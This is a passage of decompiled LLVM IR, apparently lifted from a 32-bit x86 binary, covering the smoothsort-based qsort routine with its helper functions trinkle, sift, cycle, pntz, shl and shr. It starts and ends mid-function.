  %v0_804dd22 = load i32, i32* @edx, align 4
  store i32 %v0_804dd22, i32* %stack_var_-268, align 4
  %v4_804dd41 = add i32 %arg2, -8
  %v2_804dd51 = icmp slt i32 %arg2, 0
  %v1_804dd9526 = add i32 %arg1, -1
  %v6_804dd9528 = sub i32 0, %arg1
  %v7_804dd9529 = and i32 %arg1, %v6_804dd9528
  %v8_804dd9530 = icmp slt i32 %v7_804dd9529, 0
  %v9_804dd9531 = icmp eq i32 %v1_804dd9526, 0
  %v10_804dd9532 = icmp slt i32 %v1_804dd9526, 0
  %v3_804dd9c33 = icmp eq i1 %v10_804dd9532, %v8_804dd9530
  %v4_804dd9c34 = icmp eq i1 %v9_804dd9531, false
  %v5_804dd9c35 = and i1 %v4_804dd9c34, %v3_804dd9c33
  br i1 %v5_804dd9c35, label %dec_label_pc_804dd33.lr.ph, label %dec_label_pc_804dd9e

dec_label_pc_804dd33.lr.ph:                       ; preds = %entry
  %v0_804dd25 = load i32, i32* @eax, align 4
  %v4_804dd47 = ptrtoint i32* %stack_var_-280 to i32
  %v4_804dd86 = add i32 %v4_804dd47, 20
  br label %dec_label_pc_804dd33

dec_label_pc_804dd33:                             ; preds = %dec_label_pc_804dd65.dec_label_pc_804dd33_crit_edge, %dec_label_pc_804dd33.lr.ph
  %v3_804dd3c = phi i32 [ %v0_804dd22, %dec_label_pc_804dd33.lr.ph ], [ %v3_804dd3c.pre, %dec_label_pc_804dd65.dec_label_pc_804dd33_crit_edge ]
  %v2_804dd4137 = phi i32 [ %arg1, %dec_label_pc_804dd33.lr.ph ], [ %v0_804dd95.pre, %dec_label_pc_804dd65.dec_label_pc_804dd33_crit_edge ]
  %v0_804dd3336 = phi i32 [ %v0_804dd25, %dec_label_pc_804dd33.lr.ph ], [ %v0_804dd8a, %dec_label_pc_804dd65.dec_label_pc_804dd33_crit_edge ]
  %v4_804dd3c = sub i32 %v0_804dd3336, %v3_804dd3c
  store i32 %v4_804dd3c, i32* @ebx, align 4
  %v3_804dd41 = mul i32 %v2_804dd4137, 4
  %v5_804dd41 = add i32 %v4_804dd41, %v3_804dd41
  %v6_804dd41 = inttoptr i32 %v5_804dd41 to i32*
  %v7_804dd41 = load i32, i32* %v6_804dd41, align 4
  %v8_804dd41 = sub i32 %v4_804dd3c, %v7_804dd41
  store i32 %v8_804dd41, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-272, align 4
  store i32 %arg2, i32* %stack_var_-276, align 4
  store i32 %v8_804dd41, i32* %stack_var_-280, align 4
  call void @__pseudo_call(i32 %v0_804dd10)
  br i1 %v2_804dd51, label %dec_label_pc_804dd65, label %dec_label_pc_804dd55

dec_label_pc_804dd55:                             ; preds = %dec_label_pc_804dd33
  store i32 %arg2, i32* %stack_var_-276, align 4
  store i32 %arg2, i32* %stack_var_-280, align 4
  call void @__pseudo_call(i32 %v0_804dd10)
  %v3_804dd9e.pre = load i32, i32* %stack_var_-272, align 4
  br label %dec_label_pc_804dd9e

dec_label_pc_804dd65:                             ; preds = %dec_label_pc_804dd33
  %v0_804dd65 = load i32, i32* @ecx, align 4
  store i32 %v0_804dd65, i32* %stack_var_-280, align 4
  call void @__pseudo_call(i32 %v0_804dd10)
  %v3_804dd7f = load i32, i32* %stack_var_-272, align 4
  %v0_804dd83 = load i32, i32* @edi, align 4
  %v1_804dd83 = add i32 %v0_804dd83, -2
  store i32 %v1_804dd83, i32* @edi, align 4
  %v0_804dd86 = load i32, i32* @ebx, align 4
  %v3_804dd86 = mul i32 %v3_804dd7f, 4
  %v5_804dd86 = add i32 %v4_804dd86, %v3_804dd86
  %v6_804dd86 = inttoptr i32 %v5_804dd86 to i32*
  store i32 %v0_804dd86, i32* %v6_804dd86, align 4
  %v0_804dd8a = load i32, i32* @ebx, align 4
  %v3_804dd8c = load i32, i32* %stack_var_-272, align 4
  %v4_804dd8c = add i32 %v3_804dd8c, 1
  store i32 %v4_804dd8c, i32* %stack_var_-272, align 4
  %v0_804dd95.pre = load i32, i32* @edi, align 4
  %v1_804dd95 = add i32 %v0_804dd95.pre, -1
  %v6_804dd95 = sub i32 0, %v0_804dd95.pre
  %v7_804dd95 = and i32 %v0_804dd95.pre, %v6_804dd95
  %v8_804dd95 = icmp slt i32 %v7_804dd95, 0
  %v9_804dd95 = icmp eq i32 %v1_804dd95, 0
  %v10_804dd95 = icmp slt i32 %v1_804dd95, 0
  %v3_804dd9c = icmp eq i1 %v10_804dd95, %v8_804dd95
  %v4_804dd9c = icmp eq i1 %v9_804dd95, false
  %v5_804dd9c = and i1 %v4_804dd9c, %v3_804dd9c
  br i1 %v5_804dd9c, label %dec_label_pc_804dd65.dec_label_pc_804dd33_crit_edge, label %dec_label_pc_804dd9e

dec_label_pc_804dd65.dec_label_pc_804dd33_crit_edge: ; preds = %dec_label_pc_804dd65
  %v3_804dd3c.pre = load i32, i32* %stack_var_-268, align 4
  br label %dec_label_pc_804dd33

dec_label_pc_804dd9e:                             ; preds = %entry, %dec_label_pc_804dd65, %dec_label_pc_804dd55
  %v3_804dd9e = phi i32 [ %v3_804dd9e.pre, %dec_label_pc_804dd55 ], [ %tmp19, %entry ], [ %v4_804dd8c, %dec_label_pc_804dd65 ]
  store i32 %v3_804dd9e, i32* @ecx, align 4
  %v2_804dda2 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v2_804dda2, i32* @edx, align 4
  %v2_804dda6 = load i32, i32* %stack_var_-276, align 4
  store i32 %v2_804dda6, i32* @eax, align 4
  %v0_804dda9 = call i32 @cycle()
  %v2_804ddb6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ddb6, i32* @edi, align 4
  store i32 %v0_804dd13, i32* @ebp, align 4
  ret i32 %v0_804dda9

; uselistorder directives
  uselistorder i32 %v1_804dd95, { 1, 0 }
  uselistorder i32 %v0_804dd95.pre, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804dd10, { 2, 0, 1 }
  uselistorder i32* %stack_var_-272, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 %arg2, { 0, 1, 4, 5, 3, 2 }
  uselistorder label %dec_label_pc_804dd9e, { 1, 2, 0 }
}

define i32 @trinkle(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg2 to i32
  %stack_var_-260 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ddb9 = load i32, i32* @ebp, align 4
  store i32 %v0_804ddb9, i32* %stack_var_-4, align 4
  %v0_804ddba = load i32, i32* @eax, align 4
  store i32 %v0_804ddba, i32* @ebp, align 4
  %v0_804ddbc = load i32, i32* @edi, align 4
  %v0_804ddbd = load i32, i32* @esi, align 4
  %v0_804ddbe = load i32, i32* @ebx, align 4
  store i32 %v0_804ddbe, i32* %stack_var_-16, align 4
  store i32 %tmp15, i32* %eax.global-to-local, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v0_804ddd7 = load i32, i32* @ecx, align 4
  store i32 %v0_804ddd7, i32* %stack_var_-268, align 4
  %v2_804ddde = load i32, i32* %arg2, align 4
  store i32 1, i32* %stack_var_-260, align 4
  %v1_804ddef = add i32 %tmp15, 4
  %v2_804ddef = inttoptr i32 %v1_804ddef to i32*
  %v3_804ddef = load i32, i32* %v2_804ddef, align 4
  store i32 %v3_804ddef, i32* %eax.global-to-local, align 4
  %v8_804de9d = icmp eq i32 %v2_804ddde, 0
  %v12_804de9d = icmp eq i32 %v2_804ddde, 1
  %v2_804de0e = mul i32 %tmp15, 4
  %v4_804de14 = ptrtoint i32* %stack_var_-272 to i32
  %v7_804de16 = ptrtoint i32* %stack_var_-280 to i32
  %v2_804de78 = ptrtoint i32* %stack_var_-36 to i32
  %v7_804de36 = icmp sgt i32* %arg2, inttoptr (i32 1 to i32*)
  %v1_804dea5 = icmp eq i1 %v12_804de9d, false
  %v3_804de11 = add i32 %v2_804de0e, %arg4
  %v4_804de11 = inttoptr i32 %v3_804de11 to i32*
  %v2_804de45 = add i32 %arg4, -8
  %v1_804deb3 = icmp eq i1 %v8_804de9d, false
  br label %dec_label_pc_804de9d

dec_label_pc_804ddfe:                             ; preds = %dec_label_pc_804deab, %dec_label_pc_804de9d
  %v0_804de05 = load i32, i32* @ebp, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %v2_804de0e, i32* @edi, align 4
  %v5_804de11 = load i32, i32* %v4_804de11, align 4
  %v6_804de11 = sub i32 %v0_804de05, %v5_804de11
  store i32 %v6_804de11, i32* @esi, align 4
  store i32 %arg4, i32* %stack_var_-276, align 4
  store i32 %v0_804ddba, i32* %stack_var_-280, align 4
  %v7_804de1b = load i32, i32* %stack_var_-272, align 4
  call void @__pseudo_call(i32 %v7_804de1b)
  %v0_804de22 = load i32, i32* %eax.global-to-local, align 4
  %tmp31 = icmp slt i32 %v0_804de22, 1
  %v0_804deb9.pre = load i32, i32* @ebx, align 4
  br i1 %tmp31, label %dec_label_pc_804deb9, label %dec_label_pc_804de2a

dec_label_pc_804de2a:                             ; preds = %dec_label_pc_804ddfe
  %v1_804de2a = icmp eq i32 %v0_804deb9.pre, 0
  %v1_804de2c = icmp eq i1 %v1_804de2a, false
  br i1 %v1_804de2c, label %dec_label_pc_804de69, label %dec_label_pc_804de2e

dec_label_pc_804de2e:                             ; preds = %dec_label_pc_804de2a
  br i1 %v7_804de36, label %dec_label_pc_804de38, label %dec_label_pc_804de69

dec_label_pc_804de38:                             ; preds = %dec_label_pc_804de2e
  %v0_804de3f = load i32, i32* @ebp, align 4
  %v4_804de41 = load i32, i32* %stack_var_-268, align 4
  %v5_804de41 = sub i32 %v0_804de3f, %v4_804de41
  store i32 %v5_804de41, i32* @ebx, align 4
  %v0_804de45 = load i32, i32* @edi, align 4
  %v3_804de45 = add i32 %v2_804de45, %v0_804de45
  %v4_804de45 = inttoptr i32 %v3_804de45 to i32*
  %v5_804de45 = load i32, i32* %v4_804de45, align 4
  store i32 %v5_804de45, i32* @edi, align 4
  store i32 %v0_804de22, i32* %stack_var_-276, align 4
  store i32 %v0_804de22, i32* %stack_var_-280, align 4
  call void @__pseudo_call(i32 %v0_804de22)
  %v0_804de54 = load i32, i32* %eax.global-to-local, align 4
  %v2_804de54 = icmp slt i32 %v0_804de54, 0
  %v1_804de56 = icmp eq i1 %v2_804de54, false
  br i1 %v1_804de56, label %dec_label_pc_804debd, label %dec_label_pc_804de58

dec_label_pc_804de58:                             ; preds = %dec_label_pc_804de38
  store i32 %v0_804de54, i32* %stack_var_-280, align 4
  %v0_804de59 = load i32, i32* @ebx, align 4
  %v1_804de59 = load i32, i32* @edi, align 4
  %v2_804de59 = sub i32 %v0_804de59, %v1_804de59
  store i32 %v2_804de59, i32* @ebx, align 4
  call void @__pseudo_call(i32 %v0_804de54)
  %v0_804de65 = load i32, i32* %eax.global-to-local, align 4
  %v2_804de65 = icmp slt i32 %v0_804de65, 0
  %v1_804de67 = icmp eq i1 %v2_804de65, false
  br i1 %v1_804de67, label %dec_label_pc_804debd, label %dec_label_pc_804de69

dec_label_pc_804de69:                             ; preds = %dec_label_pc_804de2e, %dec_label_pc_804de58, %dec_label_pc_804de2a
  %v1_804de6f = phi i32 [ %v4_804de14, %dec_label_pc_804de2e ], [ %v7_804de16, %dec_label_pc_804de58 ], [ %v4_804de14, %dec_label_pc_804de2a ]
  %v3_804de69 = load i32, i32* %stack_var_-272, align 4
  store i32 %v3_804de69, i32* %eax.global-to-local, align 4
  %v0_804de6d = load i32, i32* @esi, align 4
  store i32 %v0_804de6d, i32* @ebp, align 4
  %v3_804de6f = mul i32 %v3_804de69, 4
  %v4_804de6f = add i32 %v1_804de6f, 16
  %v5_804de6f = add i32 %v4_804de6f, %v3_804de6f
  %v6_804de6f = inttoptr i32 %v5_804de6f to i32*
  store i32 %v0_804de6d, i32* %v6_804de6f, align 4
  %v0_804de73 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de73 = add i32 %v0_804de73, 1
  store i32 %v1_804de73, i32* %stack_var_-272, align 4
  store i32 %v2_804de78, i32* @eax, align 4
  %v1_804de7f = call i32 @pntz(i32 %v1_804de73)
  store i32 %v1_804de7f, i32* @ebx, align 4
  store i32 %v1_804de7f, i32* @edx, align 4
  store i32 %v2_804de78, i32* @eax, align 4
  %v0_804de8f = load i32, i32* %stack_var_-272, align 4
  %v1_804de8f = call i32 @shr(i32 %v0_804de8f)
  store i32 %v1_804de8f, i32* %eax.global-to-local, align 4
  %v3_804de94 = load i32, i32* %stack_var_-4, align 4
  %v4_804de94 = load i32, i32* @ebx, align 4
  %v5_804de94 = add i32 %v4_804de94, %v3_804de94
  store i32 %v5_804de94, i32* %stack_var_-4, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804de9d

dec_label_pc_804de9d:                             ; preds = %entry, %dec_label_pc_804de69
  %v0_804defa8 = phi i32 [ %v3_804ddef, %entry ], [ %v1_804de8f, %dec_label_pc_804de69 ]
  %v0_804deb94 = phi i32 [ %arg4, %entry ], [ 0, %dec_label_pc_804de69 ]
  br i1 %v1_804dea5, label %dec_label_pc_804ddfe, label %dec_label_pc_804deab

dec_label_pc_804deab:                             ; preds = %dec_label_pc_804de9d
  br i1 %v1_804deb3, label %dec_label_pc_804ddfe, label %dec_label_pc_804deb9

dec_label_pc_804deb9:                             ; preds = %dec_label_pc_804ddfe, %dec_label_pc_804deab
  %v0_804defa7 = phi i32 [ %v0_804defa8, %dec_label_pc_804deab ], [ %v0_804de22, %dec_label_pc_804ddfe ]
  %v0_804deb9 = phi i32 [ %v0_804deb94, %dec_label_pc_804deab ], [ %v0_804deb9.pre, %dec_label_pc_804ddfe ]
  %v1_804deb9 = icmp eq i32 %v0_804deb9, 0
  %v1_804debb = icmp eq i1 %v1_804deb9, false
  br i1 %v1_804debb, label %dec_label_pc_804deb9.dec_label_pc_804def0_crit_edge, label %dec_label_pc_804debd

dec_label_pc_804deb9.dec_label_pc_804def0_crit_edge: ; preds = %dec_label_pc_804deb9
  br label %dec_label_pc_804def0

dec_label_pc_804debd:                             ; preds = %dec_label_pc_804de58, %dec_label_pc_804de38, %dec_label_pc_804deb9
  %v3_804debd = load i32, i32* %stack_var_-272, align 4
  store i32 %v3_804debd, i32* @eax, align 4
  %v2_804dec1 = ptrtoint i32* %stack_var_-260 to i32
  store i32 %v2_804dec1, i32* @edx, align 4
  %v3_804dec5 = load i32, i32* %stack_var_-268, align 4
  store i32 %v3_804dec5, i32* @ecx, align 4
  %v0_804dec9 = call i32 @cycle()
  store i32 %v0_804dec9, i32* %stack_var_-280, align 4
  %v0_804ded0 = load i32, i32* @ebp, align 4
  store i32 %v0_804ded0, i32* @eax, align 4
  %v3_804dee0 = load i32, i32* %stack_var_-276, align 4
  store i32 %v3_804dee0, i32* @ecx, align 4
  %v3_804dee4 = load i32, i32* %stack_var_-272, align 4
  store i32 %v3_804dee4, i32* @edx, align 4
  %v4_804dee8 = call i32 @sift(i32 %arg1, i32 %arg3, i32 %v0_804dec9, i32 %v0_804dec9)
  store i32 %v4_804dee8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804def0

dec_label_pc_804def0:                             ; preds = %dec_label_pc_804deb9.dec_label_pc_804def0_crit_edge, %dec_label_pc_804debd
  %v0_804defa = phi i32 [ %v0_804defa7, %dec_label_pc_804deb9.dec_label_pc_804def0_crit_edge ], [ %v4_804dee8, %dec_label_pc_804debd ]
  store i32 %v3_804ddef, i32* @ebx, align 4
  %v2_804def7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804def7, i32* @esi, align 4
  store i32 %v0_804ddbd, i32* @edi, align 4
  store i32 %v0_804ddbc, i32* @ebp, align 4
  ret i32 %v0_804defa

; uselistorder directives
  uselistorder i32 %v0_804de22, { 0, 2, 4, 3, 1 }
  uselistorder i32* %stack_var_-272, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-260, { 1, 0 }
  uselistorder i32 %arg4, { 1, 2, 5, 0, 3, 4 }
  uselistorder label %dec_label_pc_804def0, { 1, 0 }
  uselistorder label %dec_label_pc_804debd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804deb9, { 1, 0 }
  uselistorder label %dec_label_pc_804de9d, { 1, 0 }
  uselistorder label %dec_label_pc_804de69, { 1, 0, 2 }
}

define i32 @qsort(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v0_804defe = load i32, i32* @ebx, align 4
  %v6_804df0c = sext i32 %arg3 to i64
  %v8_804df0c = mul nsw i64 %v6_804df0c, %arg2
  %v9_804df0c = trunc i64 %v8_804df0c to i32
  store i32 %v9_804df0c, i32* @ecx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804df1b = icmp eq i32 %v9_804df0c, 0
  br i1 %v1_804df1b, label %entry.dec_label_pc_804e17e_crit_edge, label %dec_label_pc_804df23

entry.dec_label_pc_804e17e_crit_edge:             ; preds = %entry
  %v0_804e188.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e17e

dec_label_pc_804df23:                             ; preds = %entry
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_804df2a = add i32 %v9_804df0c, %arg1
  store i32 %arg1, i32* @ebp, align 4
  %v5_804df2f = sub i32 %v2_804df2a, %arg3
  store i32 %v5_804df2f, i32* @esi, align 4
  %v2_804df36 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_804df36, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-216, align 4
  br label %dec_label_pc_804df42

dec_label_pc_804df42:                             ; preds = %dec_label_pc_804df42, %dec_label_pc_804df23
  %v1_804df4e = phi i32 [ %v1_804df51, %dec_label_pc_804df42 ], [ %v2_804df36, %dec_label_pc_804df23 ]
  %v1_804df42 = inttoptr i32 %v1_804df4e to i32*
  %v2_804df42 = load i32, i32* %v1_804df42, align 4
  store i32 %v2_804df42, i32* %eax.global-to-local, align 4
  %v2_804df44 = add i32 %v1_804df4e, 4
  %v3_804df44 = inttoptr i32 %v2_804df44 to i32*
  %v4_804df44 = load i32, i32* %v3_804df44, align 4
  %v5_804df44 = add i32 %v2_804df42, %arg3
  %v5_804df47 = add i32 %v5_804df44, %v4_804df44
  store i32 %v5_804df47, i32* %eax.global-to-local, align 4
  %v2_804df4e = add i32 %v1_804df4e, 8
  %v3_804df4e = inttoptr i32 %v2_804df4e to i32*
  store i32 %v5_804df47, i32* %v3_804df4e, align 4
  %v0_804df51 = load i32, i32* %edx.global-to-local, align 4
  %v1_804df51 = add i32 %v0_804df51, 4
  store i32 %v1_804df51, i32* %edx.global-to-local, align 4
  %v0_804df54 = load i32, i32* %eax.global-to-local, align 4
  %v1_804df54 = load i32, i32* @ecx, align 4
  %v7_804df54 = icmp ult i32 %v0_804df54, %v1_804df54
  br i1 %v7_804df54, label %dec_label_pc_804df42, label %dec_label_pc_804df58

dec_label_pc_804df58:                             ; preds = %dec_label_pc_804df42
  %v0_804df5f = load i32, i32* @esi, align 4
  store i32 1, i32* @edi, align 4
  %v1_804df66 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804df66 = sub i32 %v0_804df5f, %v1_804df66
  store i32 %v2_804df66, i32* %eax.global-to-local, align 4
  store i32 %v2_804df66, i32* @ebx, align 4
  store i32 1, i32* %stack_var_-24, align 4
  %v1_804df75 = sub i32 0, %arg3
  store i32 %v1_804df75, i32* @edx, align 4
  %v2_804e044 = ptrtoint i32* %stack_var_-24 to i32
  %v0_804e068.pre = load i32, i32* @ebp, align 4
  %v7_804e06839 = icmp ult i32 %v0_804e068.pre, %v0_804df5f
  br i1 %v7_804e06839, label %dec_label_pc_804df8b, label %dec_label_pc_804e070

dec_label_pc_804df8b:                             ; preds = %dec_label_pc_804df58, %dec_label_pc_804e055
  %v0_804e00748 = phi i32 [ %v5_804e05d, %dec_label_pc_804e055 ], [ %v0_804e068.pre, %dec_label_pc_804df58 ]
  %v3_804df8b47 = phi i32 [ %v4_804e055, %dec_label_pc_804e055 ], [ 1, %dec_label_pc_804df58 ]
  %v7_804dfd646 = phi i32 [ %v5_804e064, %dec_label_pc_804e055 ], [ %v2_804df66, %dec_label_pc_804df58 ]
  %v1_804df92 = urem i32 %v3_804df8b47, 4
  store i32 %v1_804df92, i32* %eax.global-to-local, align 4
  %v9_804df95 = icmp eq i32 %v1_804df92, 3
  %v1_804df98 = icmp eq i1 %v9_804df95, false
  br i1 %v1_804df98, label %dec_label_pc_804dfd3, label %dec_label_pc_804df9a

dec_label_pc_804df9a:                             ; preds = %dec_label_pc_804df8b
  %v0_804df9a = load i32, i32* @ecx, align 4
  store i32 %v0_804e00748, i32* @eax, align 4
  %v0_804dfa3 = load i32, i32* @edi, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804dfb5 = call i32 @sift(i32 %v0_804dfa3, i32 %v2_804df36, i32 %v0_804df9a, i32 %v0_804df9a)
  store i32 %v2_804e044, i32* @eax, align 4
  store i32 2, i32* @edx, align 4
  %v1_804dfc6 = call i32 @shr(i32 %v0_804dfa3)
  store i32 %v1_804dfc6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e055

dec_label_pc_804dfd3:                             ; preds = %dec_label_pc_804df8b
  %v0_804dfd3 = load i32, i32* @edi, align 4
  %v1_804dfd3 = add i32 %v0_804dfd3, -1
  store i32 %v1_804dfd3, i32* %eax.global-to-local, align 4
  %v0_804dfd6 = load i32, i32* @esp, align 4
  %v2_804dfd6 = mul i32 %v1_804dfd3, 4
  %v3_804dfd6 = add i32 %v0_804dfd6, 20
  %v4_804dfd6 = add i32 %v3_804dfd6, %v2_804dfd6
  %v5_804dfd6 = inttoptr i32 %v4_804dfd6 to i32*
  %v6_804dfd6 = load i32, i32* %v5_804dfd6, align 4
  %v13_804dfd6 = icmp ult i32 %v6_804dfd6, %v7_804dfd646
  store i32 %v1_804dfd3, i32* %stack_var_-236, align 4
  br i1 %v13_804dfd6, label %dec_label_pc_804e006, label %dec_label_pc_804dfdf

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dfd3
  store i32 %arg4, i32* @ecx, align 4
  store i32 %v0_804e00748, i32* @eax, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v4_804dfff = inttoptr i32 %v0_804dfd3 to i32*
  %v5_804dfff = call i32 @trinkle(i32 %v2_804e044, i32* %v4_804dfff, i32 0, i32 %v2_804df36)
  br label %dec_label_pc_804e023

dec_label_pc_804e006:                             ; preds = %dec_label_pc_804dfd3
  %v0_804e006 = load i32, i32* @edx, align 4
  store i32 %v0_804e00748, i32* @eax, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804e01e = call i32 @sift(i32 %v0_804dfd3, i32 %v2_804df36, i32 %v0_804e006, i32 %v0_804e006)
  br label %dec_label_pc_804e023

dec_label_pc_804e023:                             ; preds = %dec_label_pc_804dfdf, %dec_label_pc_804e006
  %storemerge = phi i32 [ %v4_804e01e, %dec_label_pc_804e006 ], [ %v5_804dfff, %dec_label_pc_804dfdf ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_804e026 = load i32, i32* @edi, align 4
  %v9_804e026 = icmp eq i32 %v0_804e026, 1
  %v1_804e029 = icmp eq i1 %v9_804e026, false
  br i1 %v1_804e029, label %dec_label_pc_804e041, label %dec_label_pc_804e02b

dec_label_pc_804e02b:                             ; preds = %dec_label_pc_804e023
  store i32 1, i32* @edx, align 4
  %v12_804e030 = and i32 %v0_804e026, -65536
  store i32 %v12_804e030, i32* @edi, align 4
  store i32 %v2_804e044, i32* @eax, align 4
  %v0_804e03a = call i32 @shl()
  store i32 %v0_804e03a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e055

dec_label_pc_804e041:                             ; preds = %dec_label_pc_804e023
  %v2_804e041 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_804e041, i32* @edx, align 4
  store i32 %v2_804e044, i32* @eax, align 4
  store i32 1, i32* @edi, align 4
  %v0_804e050 = call i32 @shl()
  store i32 %v0_804e050, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e055

dec_label_pc_804e055:                             ; preds = %dec_label_pc_804df9a, %dec_label_pc_804e02b, %dec_label_pc_804e041
  %v3_804e055 = load i32, i32* %stack_var_-24, align 4
  %v4_804e055 = or i32 %v3_804e055, 1
  store i32 %v4_804e055, i32* %stack_var_-24, align 4
  %v0_804e05d = load i32, i32* @ebp, align 4
  %v5_804e05d = add i32 %v0_804e05d, %arg3
  store i32 %v5_804e05d, i32* @ebp, align 4
  %v0_804e064 = load i32, i32* @ebx, align 4
  %v5_804e064 = sub i32 %v0_804e064, %arg3
  store i32 %v5_804e064, i32* @ebx, align 4
  %v1_804e068.pre = load i32, i32* @esi, align 4
  %v7_804e068 = icmp ult i32 %v5_804e05d, %v1_804e068.pre
  br i1 %v7_804e068, label %dec_label_pc_804df8b, label %dec_label_pc_804e068.dec_label_pc_804e070_crit_edge

dec_label_pc_804e068.dec_label_pc_804e070_crit_edge: ; preds = %dec_label_pc_804e055
  %v0_804e079.pre = load i32, i32* @edi, align 4
  %phitmp = inttoptr i32 %v0_804e079.pre to i32*
  br label %dec_label_pc_804e070

dec_label_pc_804e070:                             ; preds = %dec_label_pc_804e068.dec_label_pc_804e070_crit_edge, %dec_label_pc_804df58
  %v0_804e079 = phi i32* [ %phitmp, %dec_label_pc_804e068.dec_label_pc_804e070_crit_edge ], [ inttoptr (i32 1 to i32*), %dec_label_pc_804df58 ]
  %v0_804e007.lcssa = phi i32 [ %v5_804e05d, %dec_label_pc_804e068.dec_label_pc_804e070_crit_edge ], [ %v0_804e068.pre, %dec_label_pc_804df58 ]
  store i32 %v0_804e007.lcssa, i32* @eax, align 4
  store i32 %v2_804e044, i32* @ebx, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %v2_804e044, i32* @esi, align 4
  store i32 %arg4, i32* @ecx, align 4
  %v5_804e092 = call i32 @trinkle(i32 %v2_804e044, i32* %v0_804e079, i32 0, i32 %v2_804df36)
  store i32 %v5_804e092, i32* %eax.global-to-local, align 4
  %v0_804e097 = load i32, i32* @ebp, align 4
  %v5_804e099 = sub i32 %v0_804e097, %arg3
  store i32 %v5_804e099, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e159

dec_label_pc_804e0ac:                             ; preds = %dec_label_pc_804e159
  %v10_804e159 = icmp slt i32 %v1_804e159, 0
  %v6_804e159 = sub i32 0, %v0_804e159
  %v7_804e159 = and i32 %v0_804e159, %v6_804e159
  %v8_804e159 = icmp slt i32 %v7_804e159, 0
  %v3_804e0ac = icmp eq i1 %v10_804e159, %v8_804e159
  br i1 %v3_804e0ac, label %dec_label_pc_804e0c7, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804e162, %dec_label_pc_804e0ac
  store i32 %v2_804e044, i32* @eax, align 4
  %v1_804e0b0 = call i32 @pntz(i32 %stack_var_-232.0)
  store i32 %v1_804e0b0, i32* @ebx, align 4
  store i32 %v1_804e0b0, i32* @edx, align 4
  store i32 %v2_804e044, i32* @eax, align 4
  %v0_804e0bb = load i32, i32* @edi, align 4
  %v2_804e0bb = add i32 %v0_804e0bb, %v1_804e0b0
  store i32 %v2_804e0bb, i32* @edi, align 4
  %v1_804e0bd = call i32 @shr(i32 %stack_var_-232.0)
  br label %dec_label_pc_804e14d

dec_label_pc_804e0c7:                             ; preds = %dec_label_pc_804e0ac
  store i32 2, i32* @edx, align 4
  store i32 %v2_804e044, i32* @eax, align 4
  %v0_804e0ce = call i32 @shl()
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e044, i32* @eax, align 4
  %v3_804e0da = load i32, i32* %stack_var_-24, align 4
  %v4_804e0da = xor i32 %v3_804e0da, 7
  store i32 %v4_804e0da, i32* %stack_var_-24, align 4
  %v0_804e0e2 = load i32, i32* @edi, align 4
  %v1_804e0e2 = add i32 %v0_804e0e2, -2
  store i32 %v1_804e0e2, i32* @edi, align 4
  %v1_804e0e5 = call i32 @shr(i32 %v4_804e0da)
  store i32 %v2_804df36, i32* %edx.global-to-local, align 4
  %v0_804e0ee = load i32, i32* @ebp, align 4
  store i32 %v0_804e0ee, i32* %eax.global-to-local, align 4
  %v1_804e0f0 = load i32, i32* @esp, align 4
  %v2_804e0f0 = load i32, i32* @edi, align 4
  %v3_804e0f0 = mul i32 %v2_804e0f0, 4
  %v4_804e0f0 = add i32 %v1_804e0f0, 20
  %v5_804e0f0 = add i32 %v4_804e0f0, %v3_804e0f0
  %v6_804e0f0 = inttoptr i32 %v5_804e0f0 to i32*
  %v7_804e0f0 = load i32, i32* %v6_804e0f0, align 4
  %v8_804e0f0 = sub i32 %v0_804e0ee, %v7_804e0f0
  %v5_804e0f4 = sub i32 %v8_804e0f0, %arg3
  store i32 %v5_804e0f4, i32* @eax, align 4
  %v1_804e0fe = add i32 %v2_804e0f0, 1
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v4_804e111 = inttoptr i32 %v1_804e0fe to i32*
